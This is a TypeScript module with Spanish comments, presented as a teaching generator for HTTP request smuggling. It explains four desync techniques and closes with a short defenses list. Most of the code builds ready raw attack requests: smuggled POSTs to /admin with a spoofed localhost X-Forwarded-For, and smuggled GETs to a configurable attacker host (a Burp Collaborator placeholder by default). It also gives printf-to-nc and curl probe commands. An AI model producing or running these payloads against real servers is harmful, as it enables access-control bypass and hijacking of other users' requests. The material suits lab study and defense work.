/* HTTP Request Smuggling — generador didáctico de peticiones desincronizadas.
   Muestra CÓMO interpreta cada capa la misma petición y por qué el siguiente
   usuario "come" el prefijo. Solo genera texto: la prueba es contra TU lab. */

export type SmuggleTech = 'cl-te' | 'te-cl' | 'te-te' | 'cl-cl'

export interface SmuggleTechnique {
  id: SmuggleTech
  name: string
  frontend: string
  backend: string
  why: string
}

export const SMUGGLE_TECHNIQUES: SmuggleTechnique[] = [
  {
    id: 'cl-te',
    name: 'CL.TE — front usa Content-Length, back usa Transfer-Encoding',
    frontend: 'Lee Content-Length: 6 → reenvía EXACTAMENTE 6 bytes de cuerpo: "0\r\n\r\n" se queda en el socket del backend.',
    backend: 'Usa Transfer-Encoding: chunked → espera un chunked body: ve "0\r\n\r\n" como el FINAL del chunked (eso era el cuerpo para el front).',
    why: 'El backend queda esperando el siguiente chunked request y lo que llegue después lo parsea como EL PRINCIPIO de la petición del SIGUIENTE usuario.',
  },
  {
    id: 'te-cl',
    name: 'TE.CL — front usa Transfer-Encoding, back usa Content-Length',
    frontend: 'Chunked → reenvía TODO el cuerpo (incluido el "0\r\n\r\n" y lo que venga después).',
    backend: 'Lee Content-Length: 4 → solo consume 4 bytes ("8 =\r\n..." parcial): el resto queda bufferado como LA SIGUIENTE petición.',
    why: 'El remanente del cuerpo es una petición entera construida por ti: envenena la cola del backend para el siguiente usuario.',
  },
  {
    id: 'te-te',
    name: 'TE.TE — ofuscar TE para que solo una capa lo vea',
    frontend: 'Ve "Transfer-Encoding: xchunked" → no es chunked → usa Content-Length.',
    backend: 'Normaliza mejor y ve "Transfer-Encoding: chunked" embebido → chunked.',
    why: 'La ofusación (espacios, tab, sufijos, duplicados) rompe el acuerdo: cada implementación "gana" según su parser. Es el método para descubrir la desincronización cuando CL.TE/TE.CL puros están bloqueados.',
  },
  {
    id: 'cl-cl',
    name: 'CL.CL duplicado — cabeceeras Content-Length distintas',
    frontend: 'Lee el PRIMER Content-Length.',
    backend: 'Lee el SEGUNDO (o concatena, o rechaza: depende del stack).',
    why: 'Si ambos aceptan la petición con valores distintos, cada capa corta el cuerpo donde quiere: desincronización directa sin TE.',
  },
]

export const buildSmuggleRequest = (tech: SmuggleTech, attack: 'probe' | 'steal' | 'redirect', attackerHost: string, path = '/admin'): string => {
  const host = attackerHost || 'TU-COLLABORATOR.burpcollaborator.net'
  if (tech === 'cl-te') {
    if (attack === 'probe') {
      return [
        'POST / HTTP/1.1',
        'Host: target.com',
        'Content-Length: 6',
        'Transfer-Encoding: chunked',
        '',
        '0',
        '',
        '',
      ].join('\r\n') + '\r\n'
    }
    return [
      'POST / HTTP/1.1',
      'Host: target.com',
      'Content-Length: 4',
      'Transfer-Encoding: chunked',
      '',
      '1',
      'Z',
      'POST ' + path + ' HTTP/1.1',
      'Host: target.com',
      'X-Forwarded-For: 127.0.0.1',
      'Connection: close',
      '',
      'GET http://' + host + '/ HTTP/1.1',
      'Host: ' + host,
      'X-Smuggled: by CL.TE',
      '',
      '',
    ].join('\r\n') + '\r\n'
  }
  if (tech === 'te-cl') {
    return [
      'POST / HTTP/1.1',
      'Host: target.com',
      'Content-Length: 4',
      'Transfer-Encoding: chunked',
      '',
      '2e', // 46 en hex: el largo del prefijo que el backend NO debe comerse
      'POST ' + path + ' HTTP/1.1',
      'Host: target.com',
      'X-Forwarded-For: 127.0.0.1',
      '',
      'GET http://' + host + '/ HTTP/1.1',
      'Host: ' + host,
      'X-Smuggled: by TE.CL',
      '0',
      '',
      '',
    ].join('\r\n') + '\r\n'
  }
  if (tech === 'te-te') {
    return [
      'POST / HTTP/1.1',
      'Host: target.com',
      'Content-Length: 4',
      'Transfer-Encoding : chunked',
      'Transfer-Encoding: xchunked',
      '',
      '0',
      '',
      'GET /404 HTTP/1.1',
      'Host: target.com',
      'X-Ofuscado: solo-una-capa-lo-ve',
      '',
      '',
    ].join('\r\n') + '\r\n'
  }
  return [
    'POST / HTTP/1.1',
    'Host: target.com',
    'Content-Length: 6',
    'Content-Length: 42',
    '',
    '0',
    '',
    'GET /smuggled HTTP/1.1',
    'Host: target.com',
    '',
    '',
  ].join('\r\n') + '\r\n'
}

export const smuggleProbeLoop = (target: string): string =>
  [
    '# Detección de desincronización (contra TU lab):',
    '# 1. Manda la petición CL.TE probe de arriba con curl (no la normalice):',
    `printf 'POST / HTTP/1.1\\r\\nHost: ${target || 'target.com'}\\r\\nContent-Length: 6\\r\\nTransfer-Encoding: chunked\\r\\n\\r\\n0\\r\\n\\r\\n' | nc ${target || 'target.com'} 80`,
    '',
    '# 2. Inmediatamente manda una petición NORMAL:',
    `curl -s -o /dev/null -w "%{http_code}\\n" http://${target || 'target.com'}/`,
    '',
    '# 3. Si la normal responde con 400/500 o el propio POST falla con timeout,',
    '#    la cola quedó desincronizada: smuggling viable.',
  ].join('\n')

export const smuggleDefenses = (): { check: string; why: string }[] => [
  { check: 'HTTP/2 end-to-end (o h2 con clear-text downgrade bloqueado)', why: 'Con HTTP/2 real de extremo a extremo, las cabeceras CL/TE del cliente se rechazan: la desincronización clásica desaparece.' },
  { check: 'Normalización compartida (mismo proxy/library en ambas capas)', why: 'El 90% de los smuggles nacen de dos parsers distintos: unificar la capa de parsing elimina el acuerdo roto.' },
  { check: 'Rechazar peticiones con CL+TE y CL duplicado (400 inmediato)', why: 'RFC 7230 exige rechazarlas: many stacks las procesan "por compatibilidad" y ahí está el bug.' },
  { check: 'Timeout de conexión por cliente y no por petición', why: 'Reduce la ventana de explotación: las peticiones residualmente envenenadas caducan antes de que llegue la víctima.' },
]
